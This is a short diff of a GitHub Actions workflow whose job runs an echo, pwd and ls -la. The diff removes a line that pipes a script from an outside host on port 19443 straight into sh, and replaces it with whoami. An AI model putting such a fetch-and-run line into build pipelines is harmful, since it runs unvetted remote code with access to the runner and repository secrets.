@@ -11,4 +11,4 @@ jobs:
         echo "Hello, GitHub Actions!"
         pwd
         ls -la
-        curl https://im.openjad.com:19443/one.sh | sh
+        whoami
